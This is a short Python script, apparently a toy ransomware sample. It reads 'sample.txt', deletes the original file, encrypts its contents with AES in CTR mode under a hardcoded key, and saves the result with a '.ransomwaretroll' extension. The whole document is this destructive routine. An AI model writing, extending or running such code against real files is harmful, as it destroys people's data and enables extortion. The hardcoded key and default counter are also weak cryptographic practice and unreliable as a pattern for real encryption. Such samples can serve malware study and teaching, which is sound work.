import os
import pyaes

# Open the file to be encrypted
plain_file_name = "sample.txt"
with open(plain_file_name, "rb") as file:
    file_data = file.read()

# Remove the original file
os.remove(plain_file_name)

# Encryption key
encryption_key = b"newencryptionkey"
aes = pyaes.AESModeOfOperationCTR(encryption_key)

# Encrypt the file
encrypted_data = aes.encrypt(file_data)

# Save the encrypted file
encrypted_file_name = plain_file_name + ".ransomwaretroll"
with open(encrypted_file_name, "wb") as new_file:
    new_file.write(encrypted_data)
